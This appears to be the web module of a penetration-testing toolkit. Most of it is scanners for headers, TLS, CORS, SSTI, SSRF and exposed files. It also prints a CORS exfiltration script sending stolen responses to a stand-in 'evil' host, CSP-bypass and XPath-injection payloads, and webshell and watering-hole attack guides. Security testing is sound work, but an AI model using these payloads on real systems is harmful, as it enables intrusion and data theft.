from __future__ import annotations

import os
import socket
import ssl
from datetime import datetime, timezone
from urllib.parse import urlparse

import requests
from rich.prompt import Prompt
from rich.table import Table

from .utils import (console, header, pause, report, require_tool, run_external,
                    run_tool, soft_require)

requests.packages.urllib3.disable_warnings()  # we intentionally allow self-signed in labs

# Security headers we check for, with a one-line "why it matters".
SECURITY_HEADERS = {
    "Strict-Transport-Security": "forces HTTPS, blocks SSL-strip",
    "Content-Security-Policy": "mitigates XSS / injection",
    "X-Frame-Options": "clickjacking protection",
    "X-Content-Type-Options": "stops MIME sniffing",
    "Referrer-Policy": "controls referrer leakage",
    "Permissions-Policy": "limits browser feature access",
}


def _normalize(url: str) -> str:
    if not url.startswith(("http://", "https://")):
        url = "https://" + url
    return url


def headers_audit() -> None:
    header("HTTP header audit", "Fetch a site and grade its security headers")
    url = _normalize(console.input("URL: ").strip())
    try:
        r = requests.get(url, timeout=8, verify=False, allow_redirects=True)
    except requests.RequestException as e:
        console.print(f"[red]Request failed: {e}[/]")
        return pause()

    console.print(f"[bold]{r.status_code}[/] {r.reason}  ·  final URL: [cyan]{r.url}[/]")
    interesting = ["Server", "X-Powered-By", "Set-Cookie", "Content-Type"]

    t = Table(title="Notable response headers")
    t.add_column("Header", style="bold")
    t.add_column("Value", style="dim", overflow="fold")
    for h in interesting:
        if h in r.headers:
            t.add_row(h, r.headers[h])
    console.print(t)

    grade = Table(title="Security headers")
    grade.add_column("Header", style="bold")
    grade.add_column("Present")
    grade.add_column("Why it matters", style="dim")
    missing = []
    for h, why in SECURITY_HEADERS.items():
        present = h in r.headers
        if not present:
            missing.append(h)
        grade.add_row(h, "[green]yes[/]" if present else "[red]MISSING[/]", why)
    console.print(grade)
    score = len(SECURITY_HEADERS) - len(missing)
    console.print(f"Score: [bold]{score}/{len(SECURITY_HEADERS)}[/] security headers present.")

    report.log("web", f"Header audit {r.url}",
               [f"- Status: {r.status_code}",
                f"- Server: {r.headers.get('Server','?')}",
                f"- Security headers: {score}/{len(SECURITY_HEADERS)}",
                f"- Missing: {', '.join(missing) or 'none'}"])
    pause()


def tls_info() -> None:
    header("TLS certificate", "Inspect the cert a host presents")
    host = console.input("Host (e.g. example.com): ").strip()
    host = urlparse(_normalize(host)).hostname or host
    port = 443
    try:
        ctx = ssl.create_default_context()
        with socket.create_connection((host, port), timeout=8) as sock:
            with ctx.wrap_socket(sock, server_hostname=host) as ssock:
                cert = ssock.getpeercert()
                cipher = ssock.cipher()
    except Exception as e:
        console.print(f"[red]TLS connection failed: {e}[/]")
        return pause()

    subject = dict(x[0] for x in cert.get("subject", []))
    issuer = dict(x[0] for x in cert.get("issuer", []))
    not_after = cert.get("notAfter", "")
    days_left = "?"
    try:
        exp = datetime.strptime(not_after, "%b %d %H:%M:%S %Y %Z").replace(tzinfo=timezone.utc)
        days_left = (exp - datetime.now(timezone.utc)).days
    except ValueError:
        pass
    sans = [v for k, v in cert.get("subjectAltName", []) if k == "DNS"]

    t = Table(show_header=False, box=None)
    t.add_row("Common name", subject.get("commonName", "?"))
    t.add_row("Issuer", issuer.get("commonName", "?"))
    t.add_row("Valid until", f"{not_after}  ([bold]{days_left}[/] days left)")
    t.add_row("TLS/cipher", f"{cipher[1]} · {cipher[0]}")
    t.add_row("SANs", ", ".join(sans[:8]) + (" …" if len(sans) > 8 else ""))
    console.print(t)
    if isinstance(days_left, int) and days_left < 21:
        console.print("[yellow][!] Certificate expires soon.[/]")

    report.log("web", f"TLS cert {host}",
               [f"- Issuer: {issuer.get('commonName','?')}",
                f"- Expires: {not_after} ({days_left} days)",
                f"- Cipher: {cipher[0]}"])
    pause()


def robots_and_meta() -> None:
    header("robots.txt & sitemap", "Read the paths a site advertises")
    base = _normalize(console.input("Base URL: ").strip()).rstrip("/")
    for path in ("/robots.txt", "/sitemap.xml", "/.well-known/security.txt"):
        try:
            r = requests.get(base + path, timeout=6, verify=False)
            if r.status_code == 200 and r.text.strip():
                console.print(f"\n[green]{path}[/] ({len(r.text)} bytes):")
                console.print("[dim]" + "\n".join(r.text.splitlines()[:25]) + "[/]")
            else:
                console.print(f"[dim]{path}: {r.status_code}[/]")
        except requests.RequestException as e:
            console.print(f"[dim]{path}: {e}[/]")
    pause()


def dirbrute_handoff() -> None:
    header("Directory brute-force", "Hand off to ffuf or gobuster")
    tool = "ffuf" if require_tool("ffuf") else ("gobuster" if require_tool("gobuster") else None)
    if not tool:
        return pause()
    url = _normalize(console.input("Target URL: ").strip())
    wl = console.input("Wordlist path: ").strip('"')
    if tool == "ffuf":
        run_external(["ffuf", "-u", url.rstrip("/") + "/FUZZ", "-w", wl, "-mc", "200,301,302,403"])
    else:
        run_external(["gobuster", "dir", "-u", url, "-w", wl])
    pause()


def cors_check() -> None:
    header("CORS checker", "Test if a site reflects arbitrary Origins")
    url = _normalize(console.input("URL: ").strip())
    evil = "https://evil.example.com"
    try:
        r = requests.get(url, headers={"Origin": evil}, timeout=8, verify=False)
    except requests.RequestException as e:
        console.print(f"[red]Request failed: {e}[/]")
        return pause()
    acao = r.headers.get("Access-Control-Allow-Origin", "")
    acac = r.headers.get("Access-Control-Allow-Credentials", "")
    console.print(f"Access-Control-Allow-Origin: [bold]{acao or '(none)'}[/]")
    console.print(f"Access-Control-Allow-Credentials: [bold]{acac or '(none)'}[/]")
    if acao == evil:
        console.print("[red][!] Origin is REFLECTED[/] — arbitrary sites may read responses"
                      + (" WITH credentials!" if acac.lower() == "true" else "."))
        report.log("web", f"CORS reflection {url}", ["- Origin reflected", f"- creds: {acac}"])
    elif acao == "*":
        console.print("[yellow]Wildcard ACAO[/] — open, but credentials can't be used.")
    else:
        console.print("[green]No obvious reflection.[/]")
    pause()


def http_methods() -> None:
    header("HTTP method tester", "Which verbs does the server allow?")
    url = _normalize(console.input("URL: ").strip())
    verbs = ["GET", "POST", "PUT", "DELETE", "PATCH", "OPTIONS", "HEAD", "TRACE"]
    t = Table()
    t.add_column("Method", style="bold")
    t.add_column("Status")
    t.add_column("Note", style="dim")
    for v in verbs:
        try:
            r = requests.request(v, url, timeout=6, verify=False, allow_redirects=False)
            note = ""
            if v in ("PUT", "DELETE", "TRACE") and r.status_code < 400:
                note = "[!] potentially dangerous verb enabled"
            t.add_row(v, str(r.status_code), note)
        except requests.RequestException:
            t.add_row(v, "-", "no response")
    console.print(t)
    pause()


TECH_SIGNS = {
    "WordPress": ["wp-content", "wp-includes", "/wp-json"],
    "Drupal": ["Drupal.settings", "/sites/default/"],
    "Joomla": ["/media/jui/", "Joomla!"],
    "React": ["__REACT_DEVTOOLS", "data-reactroot", "react.production"],
    "Vue.js": ["__vue__", "data-v-"],
    "Angular": ["ng-version", "angular"],
    "Laravel": ["laravel_session", "XSRF-TOKEN"],
    "Django": ["csrfmiddlewaretoken", "__admin_media_prefix__"],
    "jQuery": ["jquery"],
    "Cloudflare": ["cf-ray", "__cfduid"],
    "nginx": ["nginx"],
    "Apache": ["apache"],
}


def tech_fingerprint() -> None:
    header("Tech fingerprint", "Guess the stack from headers + body (whatweb-lite)")
    url = _normalize(console.input("URL: ").strip())
    try:
        r = requests.get(url, timeout=8, verify=False)
    except requests.RequestException as e:
        console.print(f"[red]Request failed: {e}[/]")
        return pause()
    haystack = (r.text[:200000] + " " + str(r.headers)).lower()
    found = [tech for tech, signs in TECH_SIGNS.items()
             if any(s.lower() in haystack for s in signs)]
    server = r.headers.get("Server", "")
    powered = r.headers.get("X-Powered-By", "")
    console.print(f"Server: [cyan]{server or '?'}[/]   X-Powered-By: [cyan]{powered or '?'}[/]")
    if found:
        console.print("Detected: " + ", ".join(f"[green]{t}[/]" for t in found))
        report.log("web", f"Tech fingerprint {url}", [f"- {', '.join(found)}"])
    else:
        console.print("[yellow]No known signatures matched.[/]")
    pause()


def wayback_urls() -> None:
    header("Wayback URLs", "Historical URLs for a domain from the Internet Archive")
    domain = console.input("Domain (e.g. example.com): ").strip()
    limit = console.input("Max results [200]: ").strip() or "200"
    url = (f"http://web.archive.org/cdx/search/cdx?url={domain}/*"
           f"&output=text&fl=original&collapse=urlkey&limit={limit}")
    try:
        r = requests.get(url, timeout=25)
        r.raise_for_status()
    except requests.RequestException as e:
        console.print(f"[red]Wayback query failed: {e}[/]")
        return pause()
    urls = [u for u in r.text.splitlines() if u.strip()]
    if not urls:
        console.print("[yellow]No archived URLs found.[/]")
        return pause()
    # highlight interesting extensions
    interesting = [u for u in urls if any(x in u.lower() for x in
                   (".json", ".xml", ".sql", ".bak", ".env", ".config", ".zip",
                    "api", "admin", "?", ".js", ".txt", ".log"))]
    console.print(f"[bold]{len(urls)}[/] archived URLs "
                  f"([yellow]{len(interesting)}[/] potentially interesting):\n")
    for u in interesting[:40] or urls[:40]:
        console.print(f"  [dim]{u}[/]")
    report.log("web", f"Wayback URLs {domain}",
               [f"- {len(urls)} archived URLs, {len(interesting)} interesting"])
    pause()


def _param_target():
    url = _normalize(console.input("Base URL: ").strip())
    param = console.input("Parameter to inject: ").strip()
    return url, param


SSTI_PAYLOADS = {
    "{{7*7}}": "49", "${7*7}": "49", "<%= 7*7 %>": "49",
    "#{7*7}": "49", "{{7*'7'}}": "7777777", "${{7*7}}": "49",
}


def ssti_test() -> None:
    header("SSTI probe", "Detect server-side template injection")
    url, param = _param_target()
    hit = False
    for payload, expect in SSTI_PAYLOADS.items():
        try:
            r = requests.get(url, params={param: payload}, timeout=8, verify=False)
        except requests.RequestException as e:
            console.print(f"[red]{e}[/]")
            break
        if expect in r.text:
            console.print(f"[red][!] {payload}[/] evaluated -> [bold]{expect}[/] "
                          "reflected. Template injection likely.")
            report.log("web", f"SSTI {url}", [f"- {param} evaluates {payload}"])
            hit = True
    if not hit:
        console.print("[green]No template evaluation observed.[/]")
    pause()


REDIRECT_PAYLOADS = ["https://evil.example.com", "//evil.example.com",
                     "/\\evil.example.com", "https:evil.example.com",
                     "https://target.com.evil.example.com"]


def open_redirect_test() -> None:
    header("Open-redirect probe", "Does a redirect param send you off-site?")
    url, param = _param_target()
    hit = False
    for p in REDIRECT_PAYLOADS:
        try:
            r = requests.get(url, params={param: p}, timeout=8, verify=False,
                             allow_redirects=False)
        except requests.RequestException as e:
            console.print(f"[red]{e}[/]")
            break
        loc = r.headers.get("Location", "")
        if "evil.example.com" in loc:
            console.print(f"[red][!] redirects to {loc}[/] via {param}={p}")
            report.log("web", f"Open redirect {url}", [f"- {param} -> {loc}"])
            hit = True
    if not hit:
        console.print("[green]No external redirect observed.[/]")
    pause()


SSRF_TARGETS = ["http://127.0.0.1", "http://localhost", "http://0.0.0.0",
                "http://169.254.169.254/latest/meta-data/", "file:///etc/passwd"]


def ssrf_test() -> None:
    header("SSRF probe", "Does a URL param fetch internal resources?")
    console.print("[bright_black]Point the callback tests at the HTTP Interceptor "
                  "catch-all listener (h -> 1) to confirm blind SSRF.[/]")
    url, param = _param_target()
    t = Table()
    t.add_column("Injected", style="cyan", overflow="fold")
    t.add_column("Status")
    t.add_column("Len", justify="right")
    for target in SSRF_TARGETS:
        try:
            r = requests.get(url, params={param: target}, timeout=8, verify=False)
            t.add_row(target, str(r.status_code), str(len(r.content)))
            if "root:" in r.text or "ami-id" in r.text or "instance-id" in r.text:
                t.add_row("", "[red]-> internal content leaked![/]", "")
        except requests.RequestException as e:
            t.add_row(target, f"[dim]{type(e).__name__}[/]", "-")
    console.print(t)
    console.print("[bright_black]Big status/length differences vs a normal value "
                  "suggest the server fetched your URL.[/]")
    pause()


def git_exposed() -> None:
    header("Exposed .git", "Detect a leaked .git directory (source disclosure)")
    url = _normalize(console.input("Base URL: ").strip()).rstrip("/")
    for path in ("/.git/HEAD", "/.git/config"):
        try:
            r = requests.get(url + path, timeout=8, verify=False)
        except requests.RequestException as e:
            console.print(f"[red]{e}[/]")
            break
        if r.status_code == 200 and ("ref:" in r.text or "[core]" in r.text):
            console.print(f"[red][!] exposed:[/] {url + path}")
            console.print(f"[dim]dump it: git-dumper {url}/.git/ out[/]")
            report.log("web", f"Exposed .git {url}", [f"- {path} readable"])
            return pause()
    console.print("[green]No exposed .git found.[/]")
    pause()


TAKEOVER_FP = {
    "GitHub Pages": "There isn't a GitHub Pages site here",
    "AWS S3": "NoSuchBucket",
    "Heroku": "No such app",
    "Fastly": "Fastly error: unknown domain",
    "Shopify": "Sorry, this shop is currently unavailable",
    "Tumblr": "Whatever you were looking for doesn't currently exist",
    "Bitbucket": "Repository not found",
    "Ghost": "The thing you were looking for is no longer here",
    "Surge.sh": "project not found",
    "Zendesk": "Help Center Closed",
    "Pantheon": "The gods are wise, but do not know of the site",
}


def subdomain_takeover() -> None:
    header("Subdomain takeover", "Check a host for a dangling CNAME to an unclaimed service")
    host = console.input("Subdomain (e.g. blog.example.com): ").strip()
    body = ""
    for scheme in ("https://", "http://"):
        try:
            body = requests.get(scheme + host, timeout=8, verify=False,
                                allow_redirects=True).text
            break
        except requests.RequestException:
            continue
    hits = [svc for svc, fp in TAKEOVER_FP.items() if fp.lower() in body.lower()]
    if hits:
        console.print(f"[red][!] possible takeover -> {', '.join(hits)}[/] "
                      "(host resolves to an unclaimed provider).")
        report.log("web", f"Subdomain takeover {host}", [f"- fingerprint: {', '.join(hits)}"])
    else:
        console.print("[green]No known takeover fingerprint in the response.[/]")
    pause()


def _yn(ok: bool) -> str:
    return "[green]yes[/]" if ok else "[red]no[/]"


def cookie_audit() -> None:
    header("Cookie flags audit", "Check Set-Cookie for Secure / HttpOnly / SameSite")
    url = _normalize(console.input("URL: ").strip())
    try:
        r = requests.get(url, timeout=8, verify=False, allow_redirects=True)
    except requests.RequestException as e:
        console.print(f"[red]Request failed: {e}[/]")
        return pause()
    try:
        cookies = r.raw.headers.getlist("Set-Cookie")
    except Exception:
        cookies = [r.headers["Set-Cookie"]] if "Set-Cookie" in r.headers else []
    if not cookies:
        console.print("[yellow]No Set-Cookie headers on this response.[/]")
        return pause()
    t = Table(title="Cookies")
    t.add_column("Name", style="bold")
    t.add_column("Secure")
    t.add_column("HttpOnly")
    t.add_column("SameSite")
    weak = 0
    for c in cookies:
        low = c.lower()
        name = c.split("=", 1)[0].strip()
        sec = "secure" in low
        http = "httponly" in low
        same = low.split("samesite=", 1)[1].split(";", 1)[0] if "samesite=" in low else ""
        if not (sec and http):
            weak += 1
        t.add_row(name, _yn(sec), _yn(http), same or "[red]none[/]")
    console.print(t)
    if weak:
        console.print(f"[yellow][!] {weak} cookie(s) missing Secure/HttpOnly.[/]")
        report.log("web", f"Cookie audit {r.url}", [f"- {weak} weak cookie(s)"])
    pause()


def csp_eval() -> None:
    header("CSP evaluator", "Fetch and grade a Content-Security-Policy")
    url = _normalize(console.input("URL: ").strip())
    try:
        r = requests.get(url, timeout=8, verify=False, allow_redirects=True)
    except requests.RequestException as e:
        console.print(f"[red]Request failed: {e}[/]")
        return pause()
    csp = r.headers.get("Content-Security-Policy", "")
    if not csp:
        console.print("[red]No Content-Security-Policy header.[/] No CSP protection "
                      "against injected scripts.")
        return pause()
    console.print(f"[dim]{csp}[/]\n")
    low = csp.lower()
    issues = []
    if "unsafe-inline" in low:
        issues.append("'unsafe-inline' allows inline scripts (defeats XSS protection)")
    if "unsafe-eval" in low:
        issues.append("'unsafe-eval' allows eval()")
    if "*" in csp:
        issues.append("wildcard '*' source is over-permissive")
    if "default-src" not in low:
        issues.append("no default-src fallback directive")
    if "object-src" not in low:
        issues.append("no object-src 'none' (plugin/embed risk)")
    if "http:" in low:
        issues.append("allows plaintext http: sources")
    if issues:
        for i in issues:
            console.print(f"[yellow][!] {i}[/]")
        report.log("web", f"CSP eval {r.url}", [f"- {len(issues)} weaknesses"])
    else:
        console.print("[green]No obvious CSP weaknesses.[/]")
    pause()


SENSITIVE_PATHS = [
    "/.env", "/.git/config", "/.svn/entries", "/.DS_Store", "/.htaccess",
    "/web.config", "/config.php.bak", "/wp-config.php.bak", "/backup.zip",
    "/backup.sql", "/db.sql", "/dump.sql", "/database.sql", "/.aws/credentials",
    "/docker-compose.yml", "/Dockerfile", "/phpinfo.php", "/server-status",
    "/composer.json", "/package.json", "/.npmrc", "/id_rsa", "/.bash_history",
]


def exposed_files() -> None:
    header("Sensitive file probe", "Check for leaked config / backup / VCS files")
    base = _normalize(console.input("Base URL: ").strip()).rstrip("/")
    t = Table(title="Exposed-file scan")
    t.add_column("Path", style="cyan")
    t.add_column("Status")
    t.add_column("Size", justify="right")
    found = []
    for path in SENSITIVE_PATHS:
        try:
            r = requests.get(base + path, timeout=6, verify=False, allow_redirects=False)
        except requests.RequestException:
            continue
        if r.status_code == 200 and r.content:
            t.add_row(path, "[red]200 OK[/]", str(len(r.content)))
            found.append(path)
        elif r.status_code in (401, 403):
            t.add_row(path, f"[yellow]{r.status_code}[/]", "-")
    console.print(t)
    if found:
        console.print(f"[red][!] {len(found)} file(s) returned 200 -- review them.[/]")
        report.log("web", f"Exposed files {base}", [f"- {p}" for p in found])
    else:
        console.print("[green]No sensitive files returned 200.[/]")
    pause()


def graphql_introspection() -> None:
    header("GraphQL introspection", "Ask a GraphQL endpoint to describe its schema")
    url = _normalize(console.input("GraphQL endpoint URL: ").strip())
    query = {"query": "{__schema{types{name kind}queryType{name}mutationType{name}}}"}
    try:
        r = requests.post(url, json=query, timeout=10, verify=False)
        data = r.json()
    except Exception as e:
        console.print(f"[red]Request/parse failed: {e}[/]")
        return pause()
    schema = (data.get("data") or {}).get("__schema")
    if not schema:
        console.print("[green]Introspection disabled or not GraphQL.[/] "
                      f"[dim]{str(data)[:160]}[/]")
        return pause()
    types = [ty for ty in schema.get("types", []) if not ty["name"].startswith("__")]
    console.print(f"[red][!] Introspection is ENABLED[/] -- {len(types)} types exposed.")
    console.print(f"queryType: {schema.get('queryType')}  "
                  f"mutationType: {schema.get('mutationType')}")
    for ty in types[:40]:
        console.print(f"  [cyan]{ty['kind']:12}[/] {ty['name']}")
    report.log("web", f"GraphQL introspection {url}", [f"- enabled, {len(types)} types"])
    pause()


def redirect_chain() -> None:
    header("Redirect chain", "Follow and display every hop of a redirect")
    url = _normalize(console.input("URL: ").strip())
    try:
        r = requests.get(url, timeout=8, verify=False, allow_redirects=True)
    except requests.RequestException as e:
        console.print(f"[red]Request failed: {e}[/]")
        return pause()
    hops = list(r.history) + [r]
    for i, h in enumerate(hops):
        arrow = "" if i == 0 else "-> "
        loc = h.headers.get("Location", "")
        console.print(f"  {arrow}[bold]{h.status_code}[/] [cyan]{h.url}[/]"
                      + (f"  [dim](Location: {loc})[/]" if loc else ""))
    if len(hops) > 1:
        console.print(f"\n{len(hops) - 1} redirect(s) to final: [green]{r.url}[/]")
    else:
        console.print("[green]No redirects.[/]")
    pause()


def sqlmap_scan() -> None:
    header("sqlmap", "Automated SQL injection & DB takeover (native or WSL)")
    if not soft_require("sqlmap", "apt install sqlmap  /  pip install sqlmap"):
        return pause()
    url = _normalize(console.input("Target URL (include a param, e.g. ?id=1): ").strip())
    level = console.input("Level 1-5 [1]: ").strip() or "1"
    risk = console.input("Risk 1-3 [1]: ").strip() or "1"
    extra = console.input("Extra flags [--batch]: ").strip() or "--batch"
    run_tool("sqlmap", ["-u", url, "--level", level, "--risk", risk, *extra.split()])
    pause()


def nikto_scan() -> None:
    header("Nikto", "Web-server vulnerability scanner (native or WSL)")
    if not soft_require("nikto", "apt install nikto"):
        return pause()
    url = _normalize(console.input("Target URL: ").strip())
    run_tool("nikto", ["-h", url])
    pause()


def whatweb_scan() -> None:
    header("WhatWeb", "Fingerprint web technologies (native or WSL)")
    if not soft_require("whatweb", "apt install whatweb"):
        return pause()
    url = _normalize(console.input("Target URL: ").strip())
    run_tool("whatweb", ["-a", "3", url])
    pause()


# ---------------------------------------------------------------------------
# API fuzzer (built-in)
# ---------------------------------------------------------------------------
def api_fuzzer() -> None:
    header("API Fuzzer (Built-in)")
    url = _normalize(Prompt.ask("API endpoint URL"))
    wordlist = Prompt.ask("Parameter wordlist (enter for built-in)", default="")
    params = ["id", "user", "admin", "debug", "test", "callback", "redirect",
              "url", "file", "path", "cmd", "exec", "query", "search", "filter"]
    if wordlist and os.path.exists(wordlist):
        params = []
        with open(wordlist, encoding="utf-8", errors="ignore") as fh:
            for line in fh:
                if line.strip():
                    params.append(line.strip())
                    if len(params) >= 50:
                        break
    console.print(f"[cyan]Fuzzing {len(params)} parameters on {url}[/]\n")
    for p in params:
        try:
            r = requests.get(url, params={p: "nullsec'\"<>"}, timeout=5, verify=False)
            interesting = r.status_code != 404 and len(r.text) > 0
            if interesting:
                console.print(f"  [{r.status_code}] {p} → {len(r.text)}B")
        except Exception:
            pass
    report("API fuzz", f"url={url} params={len(params)}")
    pause()


# ---------------------------------------------------------------------------
# CORS exploit payloads
# ---------------------------------------------------------------------------
def cors_exploit() -> None:
    header("CORS Exploit Payloads")
    console.print("Generate CORS exploitation payloads for authorized testing.\n")
    target = Prompt.ask("Target origin (e.g. https://victim.com)", default="https://victim.com")
    payloads = [
        f"Origin: {target}  →  ACAO: {target} (reflective)",
        f"Origin: {target}.evil.com  →  ACAO: {target}.evil.com (suffix match)",
        "Origin: null  →  ACAO: null (null origin accepted)",
        f"Origin: https://evil{target.replace('https://', '.')}  →  prefix match",
        f"JavaScript: var xhr=new XMLHttpRequest(); xhr.open('GET','{target}/api/user',true); "
        f"xhr.withCredentials=true; xhr.onload=function(){{fetch('https://evil/?d='+btoa(xhr.responseText))}}; xhr.send();",
    ]
    for p in payloads:
        console.print(f"  [yellow]{p}[/]")
    report("CORS exploit", f"target={target}")
    pause()


# ---------------------------------------------------------------------------
# CSP bypass payloads
# ---------------------------------------------------------------------------
def csp_bypass() -> None:
    header("CSP Bypass Payloads")
    console.print("Common CSP bypass techniques for authorized testing.\n")
    bypasses = [
        ("unsafe-inline", "If 'unsafe-inline' present: <script>alert(1)</script>"),
        ("unsafe-eval", "If 'unsafe-eval': <script>eval('alert(1)')</script>"),
        ("CDN whitelist", "If angular allowed: <script src='https://ajax.googleapis.com/ajax/libs/angularjs/1.6.0/angular.min.js'></script>"),
        ("JSONP", "If callback endpoints allowed: <script src='https://allowed.com/api?cb=alert#'></script>"),
        ("base-uri", "If base-uri unrestricted: <base href='https://evil.com/'>"),
        ("img-src *", "If img-src *: <img src=x onerror=alert(1)> (if no script-src)"),
        ("nonce reuse", "If nonce leaked/reused: <script nonce='LEAKED'>alert(1)</script>"),
        ("Google Fonts", "If fonts.googleapis.com: CSS injection via @import"),
    ]
    tbl = Table(title="CSP Bypass Catalogue", border_style="yellow")
    tbl.add_column("Technique", style="cyan")
    tbl.add_column("Payload")
    for t, p in bypasses:
        tbl.add_row(t, p)
    console.print(tbl)
    report("CSP bypass", f"{len(bypasses)} techniques")
    pause()


# ---------------------------------------------------------------------------
# Webshell deployment guide
# ---------------------------------------------------------------------------
def webshell_deploy() -> None:
    header("Webshell Deployment Guide")
    console.print("Methods to deploy webshells during authorized pentesting.\n")
    methods = [
        ("File upload", "Upload via insecure form, bypass extension/MIME checks"),
        ("LFI to RCE", "Log poisoning, /proc/self/environ, PHP filter wrapper"),
        ("SQL injection", "INTO OUTFILE to write shell to webroot"),
        ("CMS plugin", "Upload malicious plugin/theme (WordPress, Joomla)"),
        ("RCE vuln", "Direct command injection → curl/wget webshell"),
        ("WebDAV", "PUT method if enabled to upload shell directly"),
    ]
    for label, desc in methods:
        console.print(f"  [cyan]{label}[/] — {desc}")
    console.print("\n  [yellow]Post-deploy:[/] stabilize shell → reverse shell → persist")
    report("Webshell deploy", f"{len(methods)} methods")
    pause()


# ---------------------------------------------------------------------------
# WebSocket attack probe
# ---------------------------------------------------------------------------
def websocket_attack() -> None:
    header("WebSocket Attack Probe")
    console.print("Test WebSocket endpoints for common vulnerabilities.\n")
    url = Prompt.ask("WebSocket URL (ws:// or wss://)", default="ws://localhost:8080/ws")
    try:
        import websocket as ws_lib
    except ImportError:
        console.print("[red]pip install websocket-client[/]")
        console.print("\n  [bright_black]Manual test: use websocat or browser DevTools[/]")
        console.print("  [bright_black]  websocat wss://target/ws[/]")
        console.print("  [bright_black]  Send: {\"cmd\":\"id\"} or <script>alert(1)</script>[/]")
        report("WebSocket attack", "no websocket-client installed")
        return pause()
    try:
        ws_conn = ws_lib.create_connection(url, timeout=5)
        console.print(f"[green]Connected to {url}[/]")
        payload = Prompt.ask("Payload to send", default='{"action":"test"}')
        ws_conn.send(payload)
        resp = ws_conn.recv()
        console.print(f"  Response: {resp[:500]}")
        ws_conn.close()
        report("WebSocket attack", f"url={url} resp={resp[:200]}")
    except Exception as ex:
        console.print(f"[red]Error: {ex}[/]")
    pause()


# ---------------------------------------------------------------------------
# XPath injection payloads
# ---------------------------------------------------------------------------
def xpath_injection() -> None:
    header("XPath Injection Payloads")
    console.print("XPath injection payloads for authorized testing.\n")
    payloads = [
        "' or '1'='1",
        "' or '1'='1' or '1'='1",
        "1=1 or '1'='1",
        "' or count(/)=1 or '1'='1",
        "' or string-length(name(.))=0 or '1'='1",
        "admin' and '1'='1",
        "' or contains(.,'admin') or '1'='1",
        "'] | //user | //user[login='x",
    ]
    for i, p in enumerate(payloads, 1):
        console.print(f"  [cyan]{i}[/]  {p}")
    console.print("\n  [bright_black]Test in login forms, search boxes, XML-backed queries[/]")
    report("XPath injection", f"{len(payloads)} payloads")
    pause()


# ---------------------------------------------------------------------------
# Watering hole attack guide
# ---------------------------------------------------------------------------
def watering_hole() -> None:
    header("Watering Hole Attack Guide")
    console.print("Watering hole attack methodology for authorized red teaming.\n")
    phases = [
        ("Target analysis", "Identify websites frequently visited by target organization"),
        ("Compromise", "Exploit CMS, plugin, or server vuln on target site"),
        ("Inject", "Deploy browser exploit, drive-by download, or credential harvester"),
        ("Profile", "Filter visitors by IP range / User-Agent to hit only targets"),
        ("Persist", "Maintain access, rotate payloads, avoid detection"),
        ("Tools", "BeEF, Metasploit browser_autopwn, Evilginx, tracking pixels"),
    ]
    for label, desc in phases:
        console.print(f"  [cyan]{label}[/] — {desc}")
    report("Watering hole", f"{len(phases)} phases")
    pause()


# ---------------------------------------------------------------------------
# Captcha bypass techniques
# ---------------------------------------------------------------------------
def captcha_bypass() -> None:
    header("Captcha Bypass Techniques")
    console.print("CAPTCHA bypass methods for authorized testing.\n")
    techniques = [
        ("OCR", "Tesseract / ABBYY for simple text CAPTCHAs"),
        ("ML", "Train CNN (TensorFlow/PyTorch) on CAPTCHA samples"),
        ("Reuse", "Reuse solved tokens (session fixation, token not invalidated)"),
        ("Empty", "Submit empty/missing captcha param (server-side validation bug)"),
        ("Race", "Submit same solved token multiple times concurrently"),
        ("API", "2Captcha, Anti-Captcha, DeathByCaptcha (human-solving services)"),
        ("Audio", "Use audio CAPTCHA alt + speech-to-text (Google Speech API)"),
        ("Logic", "If 'always pass' debug captcha exists (test/dev endpoints)"),
    ]
    tbl = Table(title="Captcha Bypass", border_style="yellow")
    tbl.add_column("Technique", style="cyan")
    tbl.add_column("Description")
    for t, d in techniques:
        tbl.add_row(t, d)
    console.print(tbl)
    report("Captcha bypass", f"{len(techniques)} techniques")
    pause()


MENU = {
    "1": ("HTTP header + security audit", headers_audit),
    "2": ("TLS certificate inspector", tls_info),
    "3": ("robots.txt / sitemap / security.txt", robots_and_meta),
    "4": ("Directory brute-force (ffuf/gobuster)", dirbrute_handoff),
    "5": ("CORS misconfiguration check", cors_check),
    "6": ("HTTP method tester", http_methods),
    "7": ("Tech stack fingerprint", tech_fingerprint),
    "8": ("Wayback Machine URLs", wayback_urls),
    "9": ("SSTI probe", ssti_test),
    "10": ("Open-redirect probe", open_redirect_test),
    "11": ("SSRF probe", ssrf_test),
    "12": ("Exposed .git check", git_exposed),
    "13": ("Subdomain takeover check", subdomain_takeover),
    "14": ("Cookie flags audit", cookie_audit),
    "15": ("CSP evaluator", csp_eval),
    "16": ("Sensitive file probe", exposed_files),
    "17": ("GraphQL introspection", graphql_introspection),
    "18": ("Redirect chain tracer", redirect_chain),
    "19": ("sqlmap (SQLi automation)", sqlmap_scan),
    "20": ("Nikto web-server scan", nikto_scan),
    "21": ("WhatWeb fingerprint", whatweb_scan),
    "22": ("API fuzzer (built-in)", api_fuzzer),
    "23": ("CORS exploit payloads", cors_exploit),
    "24": ("CSP bypass payloads", csp_bypass),
    "25": ("Webshell deployment guide", webshell_deploy),
    "26": ("WebSocket attack probe", websocket_attack),
    "27": ("XPath injection payloads", xpath_injection),
    "28": ("Watering hole guide", watering_hole),
    "29": ("Captcha bypass techniques", captcha_bypass),
}
